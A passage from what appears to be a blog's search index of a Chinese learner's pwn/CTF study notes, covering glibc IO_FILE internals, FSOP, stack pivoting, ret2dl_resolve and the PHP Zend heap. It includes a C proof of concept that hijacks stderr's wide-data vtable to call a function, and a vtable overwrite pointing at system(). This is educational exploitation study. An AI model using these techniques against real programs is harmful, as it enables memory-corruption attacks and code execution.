(0x0)改为0x800\",\"_mode(0xc0)设置为1\",\"vtable(0xd8)设置为_IO_wstrn_jumps-0x20\",\"_wide_data(0xa0)设置为fake _wide_data\",\"关于_wide_data\",\"_wide_vatble(0xe0)设置为fake _wide_vatble\",\"关于_wide_vatble\",\"0x18位置改为我们要执行函数的地址\",\"#include<stdio.h> #include<stdlib.h> #include<stdint.h> #include<unistd.h> #include <string.h> void backdoor() { printf(\\\"\\\\033[31m[!] Backdoor is called!\\\\n\\\"); _exit(0); } void main() { setbuf(stdout, 0); setbuf(stdin, 0); setbuf(stderr, 0); char *p1 = calloc(0x200, 1); char *p2 = calloc(0x200, 1); puts(\\\"[*] allocate two 0x200 chunks\\\"); size_t puts_addr = (size_t)&puts; printf(\\\"[*] puts address: %p\\\\n\\\", (void *)puts_addr); size_t libc_base_addr = puts_addr - 0x84420; printf(\\\"[*] libc base address: %p\\\\n\\\", (void *)libc_base_addr); size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1ed5c0; printf(\\\"[*] _IO_2_1_stderr_ address: %p\\\\n\\\", (void *)_IO_2_1_stderr_addr); size_t _IO_wstrn_jumps_addr = libc_base_addr + 0x1e8c60; printf(\\\"[*] _IO_wstrn_jumps address: %p\\\\n\\\", (void *)_IO_wstrn_jumps_addr); char *stderr2 = (char *)_IO_2_1_stderr_addr; puts(\\\"[+] step 1: change stderr->_flags to 0x800\\\"); *(size_t *)stderr2 = 0x800; puts(\\\"[+] step 2: change stderr->_mode to 1\\\"); *(size_t *)(stderr2 + 0xc0) = 1; puts(\\\"[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20\\\"); *(size_t *)(stderr2 + 0xd8) = _IO_wstrn_jumps_addr-0x20; puts(\\\"[+] step 4: replace stderr->_wide_data with the allocated chunk p1\\\"); *(size_t *)(stderr2 + 0xa0) = (size_t)p1; puts(\\\"[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2\\\"); *(size_t *)(p1 + 0xe0) = (size_t)p2; puts(\\\"[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr > stderr->_wide_data->_wide_vtable->_IO_write_base\\\"); *(size_t *)(p1 + 0x20) = (size_t)1; puts(\\\"[+] step 7: put backdoor at fake _wide_vtable->_overflow\\\"); *(size_t *)(p2 + 0x18) = (size_t)(&backdoor); puts(\\\"[+] step 8: call fflush(stderr) to trigger backdoor func\\\"); fflush(stderr); } \"]},\"183\":{\"h\":\"浅学习Io_file\",\"t\":[\"io_file相关学习有点蛋疼 感觉较为复杂 找到了大佬的blog感觉摸到了皮毛 为了深入\",\"整体脉络:IO_FILE相关利用 | Alex's blog~ (la13x.github.io)\",\"源码阅读:IO函数源码阅读 (bambooiii.github.io)\"]},\"184\":{\"h\":\"核心结构体\",\"t\":[\"struct _IO_FILE_plus { FILE file; // 这里是常量指针 请记住和指针常量的区别 // 指针常量本质是常量 存储的是指针 也就是说其记录的指针不能被修改 但是指针指向的内容是可以修改的 // 常量指针是指针 只不过指针所指向的地址得是个常量 所以指针本身值可以被修改 但是其内容不可被修改 // 所以在开发者最初设想中 这里的vtable的值可以改变 但是它指向的内容是不可变的 // vtable指向的是类型为_IO_jump_t的常量数据 const struct _IO_jump_t *vtable; }; \"]},\"185\":{\"h\":\"file\",\"t\":[\"一般开发的时候 我们喜欢把write 和open等函数操作的文件 叫做文件流 (file) 在以前我的理解就是这是存储的文件数据的一个结构\",\"fread 和fwrite函数需要文件流指针调用虚表函数\",\"fopen函数会自动通过malloc 创建 file(文件流) 所以这里_IO_FILE_plus结构体的第一个属性file就是存储这个文件流的（倒不如说它就是文件流）\",\"代码过于复杂 暂时不搬出来了 这里我们理解即可(大概)\"]},\"186\":{\"h\":\"vtable\",\"t\":[\"这里我是这样理解的当我们自己设计一个文件读取管理器 我们如何设计一个结构体？方便我们进行处理\",\"我可能会选择这样 先创建一个FILE结构体 然后一个属性为data也就是数据本身 然后各种回调函数属性\",\"这样我们只需要调用FILE.xxxxxx()函数就可以轻易完成对文件地操作 所以这里的设计了一个vtable 指针\",\"用于指向各种处理函数 方便我们进行调用\",\"指向的是一个类型为_IO_jump_t的常量数据 这个数据主要存着各种函数\",\"struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); }; \"]},\"187\":{\"h\":\"IO函数函数的原理\",\"t\":[\"这里阅读一下IO函数的源码 方便我们直观看见 _IO_FILE_plus结构体与这些相关函数的联系 如果只是想要懂个流程就是浏览一下这部分就行 如果要详细了解一下就看文章后面调试深入理解部分的内容 这里推荐自己用有符号的libc自己调试几下 一会儿思维就通了\"]},\"188\":{\"h\":\"fopen函数\",\"t\":[\"分配对应大小的空间\",\" struct locked_FILE { struct _IO_FILE_plus fp; #ifdef _IO_MTSAFE_IO //没执行 _IO_lock_t lock; #endif struct _IO_wide_data wd; } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); //first:分配空间 \",\"初始化_IO_FILE_plus结构体数据 by _IO_no_init\",\"这里的初始值几乎全部都是赋值的null\",\"if (new_f == NULL) return NULL; #ifdef _IO_MTSAFE_IO //没执行 new_f->fp.file._lock = &new_f->lock; #endif _IO_no_init (&new_f->fp.file, 0, 0, &new_f->wd, &_IO_wfile_jumps); //second：初始化 _IO_JUMPS (&new_f->fp) = &_IO_file_jumps; //说明所有的_io_file_jump都是同一个vtable \",\"将_IO_FILE_plus结构体链接到_IO_list_all by _io_file_init_internal\",\"相当于让_io_file_plus入链 假如之前_IO_list_all指向的stderr则链接后\",\"_io_list_all ->fp->stderr (fp._chain->stderr) 这里上大佬的图\",\"fpmKdFRYo6VeTh5\",\" _IO_new_file_init_internal (&new_f->fp);//third：将file链接到_IO_list_all \",\"打开文件 by _IO_file_fopen\",\" if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL) //forth：打开文件 return __fopen_maybe_mmap (&new_f->fp.file); \",\"函数尾部\",\"_IO_un_link (&new_f->fp); free (new_f); return NULL; \"]},\"189\":{\"h\":\"调试源码 深入理解\",\"t\":[\"#include <stdio.h> #define system_ptr 0x7ffff7a52390; #include <string.h> int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\\\"flag.txt\\\",\\\"rw\\\"); vtable_ptr=(long long*)((long long)fp+0xd8); //get vtable memcpy(fp,\\\"sh\\\",3); vtable_ptr[7]=system_ptr //xsputn fwrite(\\\"hi\\\",2,1,fp); } \"]},\"190\":{\"h\":\"进入open64\",\"t\":[\"image-20240327010609541\"]},\"191\":{\"h\":\"malloc 部分\"},\"192\":{\"h\":\"源码\",\"t\":[\" struct locked_FILE { struct _IO_FILE_plus fp; #ifdef _IO_MTSAFE_IO //没执行 _IO_lock_t lock; #endif struct _IO_wide_data wd; } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); \"]},\"193\":{\"h\":\"调试\",\"t\":[\"image-20240327011453742\",\"malloc 后new_f的值\",\"image-20240327011540293\",\"$2 = { fp = { file = { _flags = 0, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 '\\\\000', _shortbuf = \\\"\\\", _lock = 0x0, _offset = 0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = '\\\\000' <repeats 19 times> }, vtable = 0x0 }, lock = { lock = 0, cnt = 0, owner = 0x0 }, wd = { _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _IO_state = { __count = 0, __value = { __wch = 0, __wchb = \\\"\\\\000\\\\000\\\\000\\\" } }, _IO_last_state = { __count = 0, __value = { __wch = 0, __wchb = \\\"\\\\000\\\\000\\\\000\\\" } }, _codecvt = { __cd_in = { step = 0x0, step_data = { __outbuf = 0x0, __outbufend = 0x0, __flags = 0, __invocation_counter = 0, __internal_use = 0, __statep = 0x0, __state = { __count = 0, __value = { __wch = 0, __wchb = \\\"\\\\000\\\\000\\\\000\\\" } } } }, __cd_out = { step = 0x0, step_data = { __outbuf = 0x0, __outbufend = 0x0, __flags = 0, __invocation_counter = 0, __internal_use = 0, __statep = 0x0, __state = { __count = 0, __value = { __wch = 0, __wchb = \\\"\\\\000\\\\000\\\\000\\\" } } } } }, _shortbuf = L\\\"\\\", _wide_vtable = 0x0 } } \",\"扩展: wd结构体\",\"struct _IO_wide_data { wchar_t *_IO_read_ptr; /* Current read pointer */ //unsigned short wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */ wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */ __mbstate_t _IO_state; __mbstate_t _IO_last_state; struct _IO_codecvt _codecvt; wchar_t _shortbuf[1]; const struct _IO_jump_t *_wide_vtable; }; \"]},\"194\":{\"h\":\"初始化 _IO_no_init\"},\"195\":{\"h\":\"源码\",\"t\":[\"_IO_no_init (&new_f->fp.file, 0, 0, &new_f->wd, &_IO_wfile_jumps); //second：初始化 // _IO_no_init源码 void _IO_no_init (FILE *fp, int flags, int orientation, struct _IO_wide_data *wd, const struct _IO_jump_t *jmp) { _IO_old_init (fp, flags); fp->_mode = orientation; if (orientation >= 0) { fp->_wide_data = wd; fp->_wide_data->_IO_buf_base = NULL; fp->_wide_data->_IO_buf_end = NULL; fp->_wide_data->_IO_read_base = NULL; fp->_wide_data->_IO_read_ptr = NULL; fp->_wide_data->_IO_read_end = NULL; fp->_wide_data->_IO_write_base = NULL; fp->_wide_data->_IO_write_ptr = NULL; fp->_wide_data->_IO_write_end = NULL; fp->_wide_data->_IO_save_base = NULL; fp->_wide_data->_IO_backup_base = NULL; fp->_wide_data->_IO_save_end = NULL; fp->_wide_data->_wide_vtable = jmp; } else /* Cause predictable crash when a wide function is called on a byte stream. */ fp->_wide_data = (struct _IO_wide_data *) -1L; fp->_freeres_list = NULL; } \"]},\"196\":{\"h\":\"调试\",\"t\":[\"image-20240327011904072\",\"执行后new_f变化\",\"(*new_f).file._flags变化\",\" _flags = -72548352, \",\"(*new_f).wd._wide_vtable 变化\",\"_wide_vtable = 0x7ffff7fb5f60 <_IO_wfile_jumps> \"]},\"197\":{\"h\":\"vtable表赋值\"},\"198\":{\"h\":\"源码\",\"t\":[\"_IO_JUMPS(&new_f->fp) = &_IO_file_jumps; \"]},\"199\":{\"h\":\"调试\",\"t\":[\"image-20240327013258111\",\"我们对_io_file_jumps数据进行查看一下 满足好奇心\",\"可以发现就是塞满了各种函数\",\"image-20240327013517671\",\"image-20240327013607798\"]},\"200\":{\"h\":\"链接部分\"},\"201\":{\"h\":\"源码\",\"t\":[\"_IO_new_file_init_internal(&new_f->fp); \"]},\"202\":{\"h\":\"调试\",\"t\":[\"image-20240327013056474\",\"_io_new_file_init_internal函数\",\"void _IO_new_file_init_internal(struct _IO_FILE_plus *fp) { /* POSIX.1 allows another file handle to be used to change the position of our file descriptor. Hence we actually don't know the actual position before we do the first fseek (and until a following fflush). */ fp->file._offset = _IO_pos_BAD; fp->file._flags |= CLOSED_FILEBUF_FLAGS; _IO_link_in(fp); fp->file._fileno = -1; // 设置_fileno -1 } \",\"image-20240327014215956\",\"_IO_link_in\",\"void _IO_link_in(struct _IO_FILE_plus *fp) { if ((fp->file._flags & _IO_LINKED) == 0) { fp->file._flags |= _IO_LINKED; // ... fp->file._chain = (FILE *)_IO_list_all; _IO_list_all = fp; // ... } } \",\"变化\",\"image-20240327014539222\",\"_chain链接_IO_2_1_stderr\",\"_lock 修改值\",\"_wide_data修改值\",\"查看list_all链\",\"可以发现和我们的fp一模一样 所以我们的_IO_list_all此时是指向的我们fp\",\"image-20240327015022273\",\"查看_IO_2_1_stderr_\",\"可以发现_chain是指向的其他file 所以此时整条链是 _IO_list_all->fp 然后后面的通过_chain链接起来\",\"image-20240327015201921\"]},\"203\":{\"h\":\"打开文件\"},\"204\":{\"h\":\"源码\",\"t\":[\"if (_IO_file_fopen((FILE *)new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap(&new_f->fp.file); \"]},\"205\":{\"h\":\"调试\",\"t\":[\"image-20240327015402527\",\"_io_file_fopen函数 太长了 主要就是判断打开模式 然后调用 io_file_open函数来打开\",\"image-20240327020322439\",\"_io_file_open函数 最终调用open 去打开文件\",\"image-20240327020501416\",\"fp 变化\",\"_fileno 变成对应的文件描述符了\",\"_offset变为了-1\",\"image-20240327020644254\"]},\"206\":{\"h\":\"FSOP细读\",\"t\":[\"io_file中经典利用 核心L_IO_flush_all_lockp函数的利用\"]},\"207\":{\"h\":\"利用条件\",\"t\":[\"知道libc基地址\",\"_IO_list_all 是作为全局变量储存在 libc.so 中的\"]},\"208\":{\"h\":\"_IO_flush_all_lockp(libc 2.23)\",\"t\":[\"三种情况下会被自动触发:\",\"当 libc 执行 abort 流程时\",\"当执行 exit 函数时\",\"当执行流从 main 函数返回时\"]},\"209\":{\"h\":\"获取fp\",\"t\":[\"image-20240328105659625\"]},\"210\":{\"h\":\"所有的文件流\",\"t\":[\"我们主要的利用都是这里 所以重点分析这里\",\"image-20240328105736546\"]},\"211\":{\"h\":\"条件\",\"t\":[\"我们可以发现这里的条件主要是两部分\",\"(fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) || (_IO_vtable_offset(fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)) \",\"第一部分\",\"fp->_mode <= 0 表示文件不可写\",\"fp->_IO_write_ptr > fp->_IO_write_base\",\"当数据写入缓冲区的时候 IO_write_ptr会逐渐增加 指向下一个可用的位置\",\"IO_write_base 是缓冲区起始位置\",\"第二部分\",\"_IO_vtable_offset(fp) == 0 虚表偏移量为0 也就是标准文件流\",\"fp->_mode > 0 文件可写\",\"(fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base) 宽字符数据的写入缓冲区中有待写入的数据\"]},\"212\":{\"h\":\"libc2.24 防御机制\",\"t\":[\"2.24之下多了 IO_validate_vtable和_IO_vtable_check两大函数\"]},\"213\":{\"h\":\"IO_validate_vtable\",\"t\":[\"这个函数主要是检测了你的vtable是否在合法区域范围之内（__libc_IO_vtables）\",\"// 验证虚表指针 如果验证失败则中止进程 static inline const struct _IO_jump_t * IO_validate_vtable (const struct _IO_jump_t *vtable) { /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ // 虚函数表指针在__libc_IO_vtables部分内 uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; // 获取vtable const char *ptr = (const char *) vtable; // 查看offset是否在这个区间范围之内 uintptr_t offset = ptr - __start___libc_IO_vtables; if (__glibc_unlikely (offset >= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable; } \"]},\"214\":{\"h\":\"libc2.24 IO_file利用\",\"t\":[\"由于已经对vtable进行了限制 我们可以另外再想办法 比如对scanf等函数进行操作\"]},\"215\":{\"h\":\"小知识点\",\"t\":[\"_IO_buf_base 表示操作的起始地址\",\"_IO_buf_end 表示结束地址\"]},\"216\":{\"h\":\"对_IO_buf_base进行劫持\",\"t\":[\"这里用wiki中提供的代码进行调试理解\",\"#include \\\"stdio.h\\\" char buf[100]; int main() { char stack_buf[100]; scanf(\\\"%s\\\",stack_buf); scanf(\\\"%s\\\",stack_buf); } \",\"没调用scanf之前\",\"image-20240421003231028\",\"调用scanf后\",\"image-20240421154819197\",\"这样可能不方便观察 我们带符号打印一下\",\"image-20240421154901421\",\"可以发现_IO_buf_base和 _IO_buf_end被赋值 分别是缓冲区chunk的开头和末尾 那么我们如果可以劫持这两个 修改这两个值就可以实现任意地址的修改\"]},\"217\":{\"h\":\"linux源码阅读(1)\",\"t\":[\"阅读 《linux源码趣读》读书笔记 仅仅作为个人回顾使用\"]},\"218\":{\"h\":\"最开始的两行代码\",\"t\":[\"cpu开机后初始化指向BIOS\",\"BIOS将硬盘启动区中512B内容写入内存0x7c00位置\",\"并跳转到0x7c00位置\",\"然后执行代码\",\"mov ax,0x07c0; mov ds,ax \"]},\"219\":{\"h\":\"解释\",\"t\":[\"cpu中pc寄存器初始值为0xFFFF0然后刚好指向ROM(BIOS)\",\"rom\",\"这里ds也就是段基地址寄存器\",\"所以mov ax,[0x0001];也就相当于mov ax,[ds:0x0001];\"]},\"220\":{\"h\":\"0x7c00到0x90000\",\"t\":[\"mov ax,0x07c0 mov ds,ax mov ax,0x9000 mov es,ax mov cx,#256 sub si,si sub di,di rep movw jmpi go,0x9000 go: mov ax,cs mov ds,ax \",\"在rep movw这个操作之前就是完成\",\"ds:0x07c0 es:0x9000 cs:256 si:0 di:0 \",\"然后rep movw这个操作就是重复执行movw\",\"movw就是将ds:si复制到es:di位置去 所以就是0x7c00移动到0x90000位置去\",\"每次移动两字节(w)\",\"移动cs寄存器存的数据下:256下\",\"所以就是将0x7c00往后512b的内容移动到0x90000去\",\"jmpi后就是跳转到go+0x90000(这里是0x90000而不是0x9000)\",\"x86为了让自己在16位这个实模式(Real Mode)下能访问到20位的地址线 所以段基址要先左移4位\",\"因为x86下的cpu寄存器就是16位 但是我们访问的内存高达20位所以我们采用ds寄存器+便宜的位置完成剩下4位的补充 所以我们需要ds的值左移4位当今的64位操作系统是没有这个东西的 因为我们用的是平坦模式(Flat Model)\"]},\"221\":{\"h\":\"php pwn学习\",\"t\":[\"学习文章:PHP堆开发简介 (deepunk.icu)\",\"[第5章 内存管理 - 5.1 Zend内存池 - 《试读] PHP7内核剖析》 - 书栈网 · BookStack\"]},\"222\":{\"h\":\"php扩展学习\",\"t\":[\"参考文章:[PHP pwn环境搭建+so文件的调试 | Pwn进你的心 (ywhkkx.github.io)](https://ywhkkx.github.io/2022/07/06/PHP pwn环境搭建+so文件的调试/)\",\"[第7章 扩展开发 - 7.2 扩展的实现原理 - 《试读] PHP7内核剖析》 - 书栈网 · BookStack\"]},\"223\":{\"h\":\"heap相关学习\",\"t\":[\"zend_alloc\",\"分为三种大小\",\"zend_mm_alloc_small (小于3/4的2mb) \",\"内存中提前分配了30相同大小的内存slot 分配在不同的page上\",\"如果大小合适会直接从这三十个slot中分配\",\"zend_mm_alloc_large (大于2mb小于4k)\",\"zend_mm_alloc_huge (小于2mb) \",\"单链表\",\"实际通过zend_mm_chunk_alloc分配\",\"一个chunk 2mb 包含512 page\",\"除了huge chunk chunk中第一页有这个结构体记录chunk的信息\",\"_zend_mm_heap是内存池的一个结构 用于管理small large huge的分配\",\"Zend中只有一个heap结构。\",\"struct _zend_mm_heap { #if ZEND_MM_STAT size_t size; //当前已用内存数 size_t peak; //内存单次申请的峰值 #endif zend_mm_free_slot *free_slot[ZEND_MM_BINS]; // 小内存分配的可用位置链表，ZEND_MM_BINS等于30，即此数组表示的是各种大小内存对应的链表头部 ... zend_mm_huge_list *huge_list; //大内存链表 zend_mm_chunk *main_chunk; //指向chunk链表头部 zend_mm_chunk *cached_chunks; //缓存的chunk链表 int chunks_count; //已分配chunk数 int peak_chunks_count; //当前request使用chunk峰值 int cached_chunks_count; //缓存的chunk数 double avg_chunks_count; //chunk使用均值，每次请求结束后会根据peak_chunks_count重新计算：(avg_chunks_count+peak_chunks_count)/2.0 } struct _zend_mm_chunk { zend_mm_heap *heap; //指向heap zend_mm_chunk *next; //指向下一个chunk zend_mm_chunk *prev; //指向上一个chunk int free_pages; //当前chunk的剩余page数 int free_tail; /* number of free pages at the end of chunk */ int num; char reserve[64 - (sizeof(void*) * 3 + sizeof(int) * 3)]; zend_mm_heap heap_slot; //heap结构，只有主chunk会用到 zend_mm_page_map free_map; //标识各page是否已分配的bitmap数组，总大小512bit，对应page总数，每个page占一个bit位 zend_mm_page_info map[ZEND_MM_PAGES]; //各page的信息：当前page使用类型(用于large分配还是small)、占用的page数等 }; //按固定大小切好的small内存槽 struct _zend_mm_free_slot { zend_mm_free_slot *next_free_slot;//此指针只有内存未分配时用到，分配后整个结构体转为char使用 }; \",\"直接从文中抠出来的图 特别详细和好理解\",\"img\"]},\"224\":{\"h\":\"small malloc and free\",\"t\":[\"static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC) { #if ZEND_MM_STAT do { size_t size = heap->size + bin_data_size[bin_num]; size_t peak = MAX(heap->peak, size); heap->size = size; heap->peak = peak; } while (0); #endif if (EXPECTED(heap->free_slot[bin_num] != NULL)) { zend_mm_free_slot *p = heap->free_slot[bin_num]; heap->free_slot[bin_num] = p->next_free_slot; return p; } else { return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC); } } static zend_always_inline void zend_mm_free_small(zend_mm_heap *heap, void *ptr, int bin_num) { zend_mm_free_slot *p; #if ZEND_MM_STAT heap->size -= bin_data_size[bin_num]; #endif #if ZEND_DEBUG do { zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info))); dbg->size = 0; } while (0); #endif p = (zend_mm_free_slot*)ptr; p->next_free_slot = heap->free_slot[bin_num]; heap->free_slot[bin_num] = p; } \"]},\"225\":{\"h\":\"调试\",\"t\":[\"image-20240428113615977\",\"每次emalloc下来的small chunk都是fd链中一条\",\"间距0x280\",\"image-20240428113701938\",\"依次向右取值\"]},\"226\":{\"h\":\"malloc\",\"t\":[\"static zend_always_inline void *zend_mm_alloc_small(zend_mm_heap *heap, int bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC) { #if ZEND_MM_STAT do { size_t size = heap->size + bin_data_size[bin_num]; size_t peak = MAX(heap->peak, size); heap->size = size; heap->peak = peak; } while (0); #endif if (EXPECTED(heap->free_slot[bin_num] != NULL)) { zend_mm_free_slot *p = heap->free_slot[bin_num]; heap->free_slot[bin_num] = p->next_free_slot; return p; } else { return zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC); } } \",\"会优先取 free_slot里面 头 \",\"然后将free_slot[bin_num]指向下一个free slot\"]},\"227\":{\"h\":\"free\",\"t\":[\"static zend_always_inline void zend_mm_free_small(zend_mm_heap *heap, void *ptr, int bin_num) { zend_mm_free_slot *p; #if ZEND_MM_STAT heap->size -= bin_data_size[bin_num]; #endif #if ZEND_DEBUG do { zend_mm_debug_info *dbg = (zend_mm_debug_info*)((char*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(sizeof(zend_mm_debug_info))); dbg->size = 0; } while (0); #endif p = (zend_mm_free_slot*)ptr; p->next_free_slot = heap->free_slot[bin_num]; heap->free_slot[bin_num] = p; } \",\"直接就是入链头部没什么好说的（\"]},\"228\":{\"h\":\"8byte（简单栈迁移）\"},\"229\":{\"h\":\"栈迁移\",\"t\":[\"这里好好学一下栈迁移这个知识点 确实重要 因为已经遇到了很多次了\"]},\"230\":{\"h\":\"栈迁移的大致操作\",\"t\":[\"通过将ebp覆盖成构造的fake_ebp ，再利用leave_ret这个gadget将esp劫持到fake_ebp的地址上。\",\"这里写个小插曲 因为大多数时候我都是去ida直接找的这个gadget 但是好像可以用命令行来解决这个问题比如我们这里用指令\",\"$ ROPgadget --binary pwn --only \\\"leave|ret\\\" \"]},\"231\":{\"h\":\"栈迁移核心\",\"t\":[\"因为我们常使用leave_ret gadget链来实现\",\" leave指令\",\"首先是依靠这个指令来实现把rbp寄存器值变为我们希望的一个地址 这样就可以实现栈的移动\",\"这里说一下我自己的浅薄理解 因为我们使用的栈其实本质就是基于rbp/rsp定位的 所以我们只需要把寄存器的值改变就实现了栈迁移 新的fake 地址后面的内容会被当成栈\",\"那么这个指令的本质:\",\"mov esp,ebp; pop ebp; \",\"ret 指令\",\"pop eip \",\"那么下面是实现原理图\",\"原理\",\"这里是执行mov esp ,ebp;这个操作之前的栈结构 我们在ebp这个位置放入我们我们希望这个栈最终落脚点 然后就会执行\",\"​ \",\"这里就是pop ebp;这个操作 因为 pop操作我们的rsp向下移动一格 ebp寄存器 存入fake_ebp1_addr\",\"然后执行指令ret--> pop eip; 这个指令 那么同理 rsp向下移动一格 eip存入我们的read_plt\",\"这里需要注意eip这个寄存器很特殊 这个寄存器是存入的我们下一条执行的指令地址 所以当执行完ret后整个程序流程就跑到了read_plt这里\",\"那么 到现在我们就可以理清楚了核心需要实现的部分:\",\"将rbp寄存器改值 ---- >栈迁移\",\"将rip寄存器改值 ------ >劫持程序流程\",\"换句话说 我们只要能够实现这两个部分就可以了\",\"接下来我们需要理解 栈的指针寄存器:rsp 还任然留在了原地 以及最容易理解错的是 当我们执行read函数的时候 程序会自动保存下一个指令的地址 这是函数的调用约定所以当我们执行完后read函数后 我们来到了leave_ret指令的地方\",\"此时我们rsp = rbp 那么我们的rsp也成功完成了迁移工作 来到了 fake_ebp的地方\",\"然后 把fake_ebp2的地址给了rbp rsp向下跑一下\",\"原理3\",\"所以这里我们是需要构造第二个fake_ebp的\",\"然后我们就成功完成了一次栈迁移\"]},\"232\":{\"h\":\"ret2dl\"},\"233\":{\"h\":\"部分前置知识讲解\"},\"234\":{\"h\":\"got表和plt表详细解说\",\"t\":[\"这里我们不对plt和got表内详细内容进行介绍了 需要了解的参考这个文章:深入窥探动态链接 - 知乎 (zhihu.com)我们主要探讨在第一次数据绑定的时候 我们程序究竟是怎么运行的 我们假设我们的函数在plt[1]的地方\",\"运行PLT[1]\",\"由于我是是第一次的调用 所以GOT[3]的内容为:PLT[1]中push reloc_arg;指令的地址 也就是会执行push reloc_arg 和jmp plt[0]自动跳转PLT[0]去完成绑定 并且 将reloc_arg参数作为参数这里PLT[N]与GOT[2+N]一 一对应\",\"jmp [GOT[3]]; push reloc_arg; jmp PLT[0]; \",\"运行PLT[0]\",\"这里相当于_dl_runtime_resolve(link_map,reloc_arg)\",\"push [GOT[1]]; // 1存的就是link_map jmp [GOT[2]]; // 2存的是_dl_runtime_resolve函数 \",\"_dl_runtime_resolve函数\",\"这里写了一个大概的源码 方便我们了解 大概就是调用_dl_fixup然后这个函数将真实的地址返回给rax寄存器 最后我们jmp过去 实现函数调用\",\"# _dl_runtime_resolve 示例 - x86_64 汇编 # # 注意：这是一个简化的示例，用于说明目的。 # 实际实现会根据系统的动态链接器的具体需求和优化而有所不同。 .global _dl_runtime_resolve .type _dl_runtime_resolve, @function _dl_runtime_resolve: # 保存寄存器，因为这些寄存器会在 _dl_fixup 中被使用 pushq %rax # 保存原始的返回地址 pushq %rcx # 保存第一个参数 pushq %rdx # 保存第二个参数 # 传递 _dl_runtime_resolve 的参数给 _dl_fixup # 第一个参数（通常是符号索引）在 %rdi 中 # 第二个参数（返回地址）现在在栈顶 movq (%rsp), %rsi # 将返回地址移动到 %rsi # 调用 _dl_fixup 来解析符号地址 # _dl_fixup(符号索引, 返回地址) call _dl_fixup # _dl_fixup 返回解析后的函数地址在 %rax 中 # 恢复寄存器 popq %rdx # 恢复第二个参数 popq %rcx # 恢复第一个参数 popq %rax # 恢复原始的返回地址 # 使用解析后的地址跳转执行目标函数 # 这里我们假设解析后的地址已经由 _dl_fixup 放入 %rax 中 jmp *%rax # _dl_fixup 函数的伪声明，需要实际实现 .type _dl_fixup, @function _dl_fixup: # 实际的 _dl_fixup 实现会在这里 ret \"]},\"235\":{\"h\":\"_dl_runtime_resolve部分详细解说\",\"t\":[\"参考文章:深入理解-dl_runtime_resolve - unr4v31 - 博客园 (cnblogs.com)\",\"_dl_runtime_resolve(link_map_obj, reloc_index) \"]},\"236\":{\"h\":\"reloc_index\",\"t\":[\"省略点将 我们可以通过reloc_index知道我们要绑定函数的名字 其获取逻辑是:\",\"elf_rel = rel_plt[reloc_index]; r_info = elf_rel.r_info; elf_sym = *(r_info); st_name = elf.sym.st_name; // 